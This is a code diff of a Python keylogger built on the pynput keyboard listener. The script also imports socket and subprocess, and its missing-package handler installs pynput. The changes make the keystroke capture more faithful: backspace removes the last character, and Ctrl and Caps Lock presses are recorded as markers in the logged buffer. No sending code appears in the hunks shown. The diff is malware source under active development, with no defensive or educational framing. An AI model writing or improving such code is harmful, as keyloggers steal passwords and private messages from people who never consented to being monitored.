@@ -1,11 +1,11 @@
 #!/usr/bin/python3
-data = ''
+
 try:
     import subprocess
     from pynput import keyboard
     import socket
     import platform
-
+    data = ''
 
 except ModuleNotFoundError:
     packages = ["keyboard","pynput"]
@@ -32,8 +32,15 @@ finally:
             data += " "
         elif key == keyboard.Key.enter:
             data += "\n"
+
         elif key == keyboard.Key.tab:
             data += "\t"
+        elif key == keyboard.Key.backspace:
+            data = data[:-1]
+        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            data += " _CTRL_ "
+        elif key == keyboard.Key.caps_lock:
+            data += " _CAPS_ " #Requires rework to detect caps on or off and covert string.
         else:
             data += str(key).strip("'")
             print(data)
